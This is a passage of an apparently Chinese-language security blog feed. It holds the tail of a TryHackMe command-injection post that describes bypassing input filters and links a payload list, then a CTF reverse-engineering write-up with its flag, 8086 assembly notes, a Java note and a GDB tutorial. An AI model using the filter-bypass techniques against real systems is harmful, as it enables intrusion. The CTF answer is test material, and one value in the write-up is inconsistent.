class="line">        </span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><h3 id="bypassing-filters绕过过滤器">BypassingFilters（绕过过滤器）</h3><p>应用程序将采用多种技术对从用户输入中获取的数据进行过滤和消毒。这些过滤器将限制你使用特定的payload；然而，我们可以利用应用程序背后的逻辑来绕过这些过滤器。例如，应用程序可以去掉引号，我们可以使用这个值的十六进制来实现相同的结果。</p><p>当执行时，虽然给定的数据将采用与预期不同的格式，但仍可以对其进行解释，并具有相同的结果。</p><h2 id="payload">Payload</h2><p>https://github.com/payloadbox/command-injection-payload-list</p>]]></content>
    
    
    <categories>
      
      <category>TryHackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>TryHackMe</tag>
      
      <tag>Command Injection</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>复现省赛逆向-ManyCheck</title>
    <link href="/2023/06/10/ManyCheck/"/>
    <url>/2023/06/10/ManyCheck/</url>
    
    <content type="html"><![CDATA[<p>复现第五届浙江省网络与信息安全竞赛中的第一道逆向题。</p><p>参考：https://blog.csdn.net/fightforyourdream/article/details/15805125</p><h1 id="manycheck">ManyCheck</h1><p>下载附件后，发现压缩包里有一个exe文件，和一个pdb文件（程序数据库文件）。直接用Exeinfo PE 打开 exe 文件，查看相关信息</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220918122046736.png" alt="image-20220918122046736"><figcaption aria-hidden="true">image-20220918122046736</figcaption></figure><p>然后用IDA打开文件，直接按F5查看<code>_main_0</code>函数的伪代码</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main_0</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> savedregs; <span class="comment">// [esp+0h] [ebp+0h]</span></span><br><span class="line"></span><br><span class="line">  sub_4013BC(asc_40CC44, savedregs);</span><br><span class="line">  sub_4013BC(aLetsEnjoyThisE, savedregs);</span><br><span class="line">  sub_4013BC(asc_40CC94, savedregs);</span><br><span class="line">  sub_40100F();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>再按 Shift+F12 查看特殊字符串</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.data:0040CA3000000007CDASCTF{</span><br><span class="line">.data:0040CA5000000026C*********** First check ***********\n\n</span><br><span class="line">.data:0040CA780000001FCGuess my lucky number(32~127)\n</span><br><span class="line">.data:0040CA9C00000008CBingo!\n</span><br><span class="line">.data:0040CAA40000000ECWhat a pity!\n</span><br><span class="line">.data:0040CAB400000029C\n\n*********** Second check ***********\n\n</span><br><span class="line">.data:0040CAE000000014CLet's do some math\n</span><br><span class="line">.data:0040CAF400000018Cn*n + 57*59 = 6388\nn = </span><br><span class="line">.data:0040CB1000000019Cm*m + 98 + 1 = 2500\nm = </span><br><span class="line">.data:0040CB300000000CCGood Math!\n</span><br><span class="line">.data:0040CB3C00000007CWrong\n</span><br><span class="line">.data:0040CB4400000028C\n\n*********** Third check ***********\n\n</span><br><span class="line">.data:0040CB6C0000001BCLet's learn rotate shift!\n</span><br><span class="line">.data:0040CB880000002CCe.g. 0b11001101 rotate right 3 -&gt; 10111001\n</span><br><span class="line">.data:0040CBB40000002DCWhich integer rotate right 16 -&gt; 1718896489\n</span><br><span class="line">.data:0040CBE400000017CGive me this integer: </span><br><span class="line">.data:0040CC0000000013CYou are so smart!\n</span><br><span class="line">.data:0040CC140000000DCCheck over!\n</span><br><span class="line">.data:0040CC240000000BCFlag is %s</span><br><span class="line">.data:0040CC3000000014CWrong, learn again\n</span><br><span class="line">.data:0040CC4400000026C************************************\n</span><br><span class="line">.data:0040CC6C00000026C*     Lets' enjoy this easy Re!    *\n</span><br><span class="line">.data:0040CC9400000026C************************************\n</span><br></pre></td></tr></tbody></table></figure><p>发现本题需要三次 check ，正确后给出flag。</p><p>双击查看<code>sub_4013BC</code>函数，看不出什么名堂，再查看<code>sub_40100F()</code>函数，最后发现如下代码</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_401050</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// ST08_1</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+0h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+4h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  sub_4013BC((<span class="type">int</span>)aFirstCheck, <span class="number">77</span>);</span><br><span class="line">  sub_4013BC((<span class="type">int</span>)aGuessMyLuckyNu, v0);</span><br><span class="line">  <span class="built_in">scanf</span>(aD, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 != v3 )</span><br><span class="line">    <span class="keyword">return</span> sub_4013BC((<span class="type">int</span>)aWhatAPity, v3);</span><br><span class="line">  sub_4013BC((<span class="type">int</span>)aBingo, v3);</span><br><span class="line">  byte_40CA37 = v1;</span><br><span class="line">  byte_40CA42 = v1 - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> sub_401014();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>分析代码可知第一个 check 的答案是<code>77</code>，再回到 String窗口查看第二个 check ，需要计算出 n 和 m ，第三个 check 是关于 rotate算法的，编写脚本</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line">n=math.sqrt(<span class="number">6388</span>-<span class="number">57</span>*<span class="number">59</span>)</span><br><span class="line">m=math.sqrt(<span class="number">2500</span>-<span class="number">1</span>-<span class="number">98</span>)</span><br><span class="line"><span class="built_in">print</span>(n,m)        <span class="comment">#n=55, m=49</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#third check</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rotate</span>(<span class="params">self, nums, k</span>):</span><br><span class="line">            <span class="comment"># Write your code here</span></span><br><span class="line">            length = <span class="built_in">len</span>(nums)</span><br><span class="line">            k = k % length</span><br><span class="line">            result = nums[length - k : length] + nums[:length - k]</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">r=Solution()</span><br><span class="line">flag=<span class="built_in">bin</span>(<span class="number">1718896489</span>)    <span class="comment">#flag=0b1100110011101000100011101101001（31位）</span></span><br><span class="line">flag=<span class="string">'0b01100110011101000100011101101001'</span>   <span class="comment">#在最前面加个'0',位数必须为整数个字节大小（8位，16位，32位）</span></span><br><span class="line">flag=<span class="built_in">list</span>(flag[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">''</span>.join(flag))</span><br><span class="line">s=r.rotate(flag,<span class="built_in">len</span>(flag)-<span class="number">16</span>)</span><br><span class="line">s=<span class="string">''</span>.join(s)</span><br><span class="line"><span class="built_in">print</span>(s)                     <span class="comment">#s='01000111011010010110011001110100'</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(<span class="number">0b1000111011010010110011001110100</span>))       <span class="comment">#119809844</span></span><br></pre></td></tr></tbody></table></figure><p>用OD打开 exe 文件，按F8运行至 first check，按顺序输入：77、55、49、1198089844。得到flag</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220918124817540.png" alt="image-20220918124817540"><figcaption aria-hidden="true">image-20220918124817540</figcaption></figure><p><code>DASCTF{M71_Gift_08L}</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Reverse</tag>
      
      <tag>rotate</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>汇编语言（七）</title>
    <link href="/2023/04/13/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%EF%BC%88%E4%B8%83%EF%BC%89/"/>
    <url>/2023/04/13/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%EF%BC%88%E4%B8%83%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="汇编语言七数据处理">汇编语言（七）——数据处理</h1><p>reg（寄存器）：ax、bx、cx、dx、ah、al、bh、bl、ch、cl、dh、dl、sp、bp、si、di；</p><p>sreg（段寄存器）：ds、ss、cs、es。</p><h2 id="bxsidi-和-bp">bx、si、di 和 bp</h2><p>在8086CPU中，只有标题中这四个寄存器可以用在 <code>[...]</code>中来进行内存单元的寻址。</p><ul><li><p>下面的指令是错误的：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax, [cx]</span><br><span class="line">mov ax, [ax]</span><br><span class="line">mov ax, [dx]</span><br><span class="line">mov ax, [ds]</span><br></pre></td></tr></tbody></table></figure></li><li><p>这四个寄存器可以单个出现，也可以这四种组合出现：bx 和 si 、bx 和di 、bp 和 si 、bp 和 di 。</p><p>注：<strong>[bx + bp]</strong> 、<strong>[si + di]</strong>，这两个组合是错误的。</p></li><li><p>只要在 <code>[...]</code> 中使用了寄存器 <strong>bp</strong>，而指令中没有显性地给出段地址，段地址就默认在 <code>ss</code> 中。</p><p>例：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax, [bp]                      含义：(ax) = ((ss)*16+(bp))</span><br><span class="line">mov ax, [bp+idata]                含义：(ax) = ((ss)*16+(bp)+idata)</span><br><span class="line">mov ax, [bp+si]                   含义：(ax) = ((ss)*16+(bp)+(si))</span><br><span class="line">mov ax, [bp+si+idata]             含义：(ax) = ((ss)*16+(bp)+(si)+idata)</span><br></pre></td></tr></tbody></table></figure></li></ul><h2 id="数据所在位置">数据所在位置</h2><p>指令在执行前，所要处理的数据可以在三个位置：<strong>CPU内部</strong>、<strong>内存</strong>、<strong>端口</strong>。</p><h2 id="数据位置的表达">数据位置的表达</h2><ol type="1"><li><p>立即数（idata）</p><p>对于直接包含在机器指令中的数据（执行前在CPU指令缓存器中），被称为立即数。</p><p>例：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1</span><br><span class="line">add bx,2000h</span><br><span class="line">or bx,00010000b</span><br><span class="line">mov al,'a'</span><br></pre></td></tr></tbody></table></figure></li><li><p>寄存器</p><p>指令要处理的数据在寄存器中，在汇编指令中给出相应的寄存器名。</p><p>例：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov ax,bx</span><br><span class="line">mov ds,ax</span><br><span class="line">push bx</span><br><span class="line">mov ds:[0],bx</span><br><span class="line">push ds</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,ax</span><br></pre></td></tr></tbody></table></figure></li><li><p>段地址（SA）和偏移地址（EA）</p><p>指令要处理的数据在内存中，在汇编指令中可用 [X] 的格式给出 EA，SA在某个段寄存器中。</p><p>存放段地址的寄存器可以是默认的，比如：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[0]</span><br><span class="line">mov ax,[di]</span><br><span class="line">mov ax,[bx+8]</span><br><span class="line">mov ax,[bx+si]</span><br><span class="line">mov ax,[bx+si+8]</span><br></pre></td></tr></tbody></table></figure><p>等指令，段地址默认在 <strong>ds</strong> 中。</p><p>存放段地址的寄存器也可以显性给出，比如：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,ds:[bp]             含义：(ax)=((ds)*16)+(bp)</span><br><span class="line">mov ax,es:[bx]</span><br><span class="line">mov ax,ss:[bx+si]</span><br><span class="line">mov ax,cs:[bx+si+8]</span><br></pre></td></tr></tbody></table></figure></li></ol><h2 id="寻址方式">寻址方式</h2><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220924122435330.png" alt="image-20220924122435330"><figcaption aria-hidden="true">image-20220924122435330</figcaption></figure><h2 id="指令要处理的数据所占的字长">指令要处理的数据所占的字长</h2><ol type="1"><li><p>通过寄存器指明要处理的数据的字长</p><p>字操作：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1</span><br><span class="line">mov bx,ds:[0]</span><br><span class="line">mov ds,ax</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">inc ax</span><br><span class="line">add ax,1000</span><br></pre></td></tr></tbody></table></figure><p>字节操作：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov al,1</span><br><span class="line">mov al,bl</span><br><span class="line">mov al,ds:[0]</span><br><span class="line">mov ds:[0],al</span><br><span class="line">inc al</span><br><span class="line">add al,100</span><br></pre></td></tr></tbody></table></figure></li><li><p>在没有寄存器名存在的情况下，用操作符<code>X ptr</code>指明内存单元的长度，X在汇编指令中可以为 word 或 byte 。</p><p>下面的指令中用了 word ptr指明了指令访问的内存单元是一个<strong>字单元</strong>：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov word ptr ds:[0],1</span><br><span class="line">inc word ptr [bx]</span><br><span class="line">inc word ptr ds:[0]</span><br><span class="line">add word ptr [bx],2</span><br></pre></td></tr></tbody></table></figure><p>下面的指令中，用 byte ptr指明了指令访问的内存单元是一个<strong>字节单元</strong>：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov byte ptr ds:[0],1</span><br><span class="line">inc byte ptr [bx]</span><br><span class="line">inc byte ptr ds:[0]</span><br><span class="line">add byte ptr [bx],2</span><br></pre></td></tr></tbody></table></figure></li><li><p>其他方法</p><p>有些指令默认了访问的是字单元还是字节单元，比如：push [1000H]就不用指明访问的是字单元还是字节单元，因为 push指令只进行<strong>字操作</strong>。</p></li></ol><h2 id="div指令">div指令</h2><p>div是除法指令。</p><ul><li>除数：有8位和16位两种，在一个寄存器或内存单元中。</li><li>被除数：默认放在 <strong>AX</strong> 或 <strong>DX和AX</strong>中，如果除数为8位，被除数则为16位，默认在 AX中存放；如果输出为16位，被除数则为32位，在 DX 和 AX 中存放，DX存放高16位，AX 存放低16位。</li><li>结果：如果除数为8位，则 AL 存储商，AH 存储余数；如果除数为16位，则AX 存储除法操作的商，DX 存储除法操作的余数。</li></ul><p>格式如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">div reg</span><br><span class="line">div 内存单元</span><br></pre></td></tr></tbody></table></figure><p>例：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">div byte ptr ds:[0]   含义：(al)=(ax)/((ds)*16+0)的商；</span><br><span class="line"> (ah)=(ax)/((ds)*16+0)的余数</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">div word ptr es:[0]   含义：(ax)=[(dx)*10000H+(ax)]/((es)*16+0)的商</span><br><span class="line">                           (dx)=[(dx)*10000H+(ax)]/((es)*16+0)的余数</span><br></pre></td></tr></tbody></table></figure><h2 id="伪指令-dd">伪指令 dd</h2><p><strong>dd</strong> 是用来定义 dword（doubleword）双字型数据的。比如</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data segment</span><br><span class="line">  db 1</span><br><span class="line">  dw 1</span><br><span class="line">  dd 1</span><br><span class="line">data ends</span><br></pre></td></tr></tbody></table></figure><ul><li>第一个数据为 01H，在<code>data:0</code>处，占1个字节；</li><li>第二个数据为 0001H，在<code>data:1</code>处，占1个字；</li><li>第三个数据为 00000001H，在<code>data:3</code>处，占2个字。</li></ul><h2 id="dup">dup</h2><p>dup是一个操作符，在汇编语言中同 db、dw、dd等一样，也是由编译器识别处理的符号。它是和 db、dw、dd等数据定义伪指令配合使用的，用来进行数据的重复。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db 3 dup (0)             ;定义了3个字节，值都为 0，相当于 db 0,0,0</span><br><span class="line">db 3 dup (0,1,2)         ;定义了9个字节，相当于 db 0,1,2,0,1,2,0,1,2</span><br><span class="line">db 3 dup('abc','ABC')    ;定义了18个字节，相当于 db 'abcABCabcABCabcABC'</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>汇编</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编</tag>
      
      <tag>内存</tag>
      
      <tag>寄存器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java中的数组相等问题</title>
    <link href="/2023/04/02/Java%E4%B8%AD%E7%9A%84%E6%95%B0%E7%BB%84%E7%9B%B8%E7%AD%89%E9%97%AE%E9%A2%98/"/>
    <url>/2023/04/02/Java%E4%B8%AD%E7%9A%84%E6%95%B0%E7%BB%84%E7%9B%B8%E7%AD%89%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h2 id="示例">示例：</h2><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>[] arr1 = {<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>};</span><br><span class="line"><span class="type">int</span>[] arr2 = {<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>};</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (arr1 == arr2) {</span><br><span class="line">    System.out.println(<span class="string">"两个数组相等"</span>);</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">    System.out.println(<span class="string">"两个数组不相等"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>上述代码输出结果为：<code>两个数组不相等</code></p><p>当我们比较两个数组是否相等时，我们不能简单地使用<code>==</code>运算符。<code>==</code>运算符比较的是内存中的位，即上述示例中，<code>arr1 == arr2</code>将比较<code>arr1</code>和<code>arr2</code>的<strong>地址</strong>是否相同，而不是数组中的值是否相同。</p><h2 id="解决方法">解决方法：</h2><p>Java中提供了<code>java.util.Arrays.equals</code>方法，可以用来比较两个数组是否相等。这个方法会比较两个数组的长度和每个元素的值是否相等，如果两个数组的长度和每个元素的值都相等，则返回<code>true</code>，否则返回<code>false</code>。或是用循环的方式比较每个元素。</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GDB入门</title>
    <link href="/2023/03/30/GDB/"/>
    <url>/2023/03/30/GDB/</url>
    
    <content type="html"><![CDATA[<p>参考：</p><p>http://c.biancheng.net/gdb/</p><p>https://www.cnblogs.com/acceptedzhs/p/13161213.html</p><p>https://zhuanlan.zhihu.com/p/259625135</p><p>https://blog.51cto.com/u_15127591/3564713</p><p>相关资料：</p><p>http://note.iawen.com/note/programming/gdb GDB入门+命令大全</p><p>https://www.cnblogs.com/acceptedzhs/p/13161213.html较详细的gdb入门资料</p><p>https://www.cnblogs.com/acceptedzhs/p/12562880.html gdb高级技巧</p><p>https://www.cnblogs.com/lvdongjie/p/8994092.html GDB用法详解</p><h1 id="gdb">GDB</h1><p>维基百科上对GDB的解释是这样的：<strong>GNU调试器</strong>（英语：<strong>G</strong>NU<strong>D</strong>e<strong>b</strong>ugger，缩写：<strong>GDB</strong>），是<a href="https://zh.wikipedia.org/wiki/GNU">GNU</a>软件系统中的标准<a href="https://zh.wikipedia.org/wiki/调试工具">调试器</a>，此外GDB也是个具有移携性的调试器，经过移携需求的调修与重新编译，如今许多的<a href="https://zh.wikipedia.org/wiki/類UNIX">类UNIX</a>操作系统上都可以使用GDB，而现有GDB所能支持调试的编程语言有<a href="https://zh.wikipedia.org/wiki/C語言">C</a>、<a href="https://zh.wikipedia.org/wiki/C%2B%2B">C++</a>、<a href="https://zh.wikipedia.org/wiki/Pascal_(程式語言)">Pascal</a>以及<a href="https://zh.wikipedia.org/wiki/Fortran">FORTRAN</a>。</p><h2 id="gdb入门">GDB入门</h2><p>将以下程序作为示例，将该文件命名为main.c</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> n,sum;</span><br><span class="line">    n = <span class="number">1</span>;</span><br><span class="line">    sum = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(n &lt;= <span class="number">100</span>)</span><br><span class="line">    {</span><br><span class="line">        sum = sum + n;</span><br><span class="line">        n = n+<span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>首先要使用gcc来编译源文件，且要使用<code>-g</code>选项，这样可以生成能够被gdb调试的可执行文件。</p><p><code>root@ls-jc2uT1jQ:~# gcc -g main.c -o main</code>将可执行文件命名为main。</p><ol type="1"><li><p>启动GDB调试器</p><p>方法一：<code>root@ls-jc2uT1jQ:~# gdb main [--silent]</code>(--silent选项会将部分没用的信息屏蔽)</p><p>方法二：也可不在gdb后加可执行文件名，进入gdb后利用file选项加载可执行文件</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ls-jc2uT1jQ:~<span class="comment"># gdb -q   &lt;---"-q"选项可省略不必要的输出信息</span></span><br><span class="line">(gdb) file main</span><br><span class="line">Reading symbols from main...</span><br></pre></td></tr></tbody></table></figure></li><li><p>打印源代码</p><p><code>l</code>选项会将带行号的源代码打印出来(注意“l”是“list”的缩写，不是数字“1”)，默认显示前十行代码，可直接回车查看后续代码。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@ls-jc2uT1jQ:~<span class="comment"># gdb main --silent</span></span><br><span class="line">Reading symbols from main...</span><br><span class="line">(gdb) l</span><br><span class="line">1<span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line">2int main ()</span><br><span class="line">3{</span><br><span class="line">4    unsigned long long int n, <span class="built_in">sum</span>;</span><br><span class="line">5</span><br><span class="line">6    n = 1;</span><br><span class="line">7    <span class="built_in">sum</span> = 0;</span><br><span class="line">8</span><br><span class="line">9    <span class="keyword">while</span> (n &lt;= 100)</span><br><span class="line">10    {</span><br><span class="line">(gdb) </span><br><span class="line">11        <span class="built_in">sum</span> = <span class="built_in">sum</span> + n;</span><br><span class="line">12        n = n + 1;</span><br><span class="line">13    }</span><br><span class="line">14</span><br><span class="line">15    <span class="built_in">return</span> 0;</span><br><span class="line">16}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li><li><p>设置断点。</p><p><code>b 函数名|行号</code>（b为break的缩写）</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b 9   &lt;---在第9行设置断点</span><br><span class="line">Breakpoint 1 at 0x1141: file main.c, line 9.</span><br></pre></td></tr></tbody></table></figure></li><li><p>运行程序。</p><table><thead><tr class="header"><th style="text-align: left;">指令</th><th style="text-align: left;">作用</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">r（全称run）</td><td style="text-align: left;">从头开始运行程序至断点</td></tr><tr class="even"><td style="text-align: left;">c（全称continue）</td><td style="text-align: left;">从当前位置运行程序至下一个断点</td></tr><tr class="odd"><td style="text-align: left;">u（全称until）行号</td><td style="text-align: left;">从当前位置运行程序至指定行号</td></tr></tbody></table><p>以<code>r</code>为例：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(gdb) r    &lt;---运行至断点，且处在断点的语句并不执行</span><br><span class="line">Starting program: /root/main </span><br><span class="line"></span><br><span class="line">Breakpoint 1, main () at main.c:9</span><br><span class="line">9    <span class="keyword">while</span> (n &lt;= 100)</span><br></pre></td></tr></tbody></table></figure></li><li><p>单步执行</p><table><thead><tr class="header"><th>指令</th><th>作用</th></tr></thead><tbody><tr class="odd"><td>n（全称next）</td><td>单步执行，不进入函数内部</td></tr><tr class="even"><td>s（全称step）</td><td>单步执行，进入函数内部</td></tr></tbody></table><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) s    &lt;---执行<span class="keyword">while</span>循环，在11行停下，此时11行的代码并未执行</span><br><span class="line">11        <span class="built_in">sum</span> = <span class="built_in">sum</span> + n;</span><br><span class="line">(gdb) n</span><br><span class="line">12        n = n + 1;</span><br></pre></td></tr></tbody></table></figure><p>拓展：si命令类似于s命令，ni命令类似于n命令。所不同的是，这两个命令（si/ni）所针对的是汇编指令，而s/n针对的是源代码。</p></li><li><p>输出变量</p><table><colgroup><col style="width: 31%"><col style="width: 68%"></colgroup><thead><tr 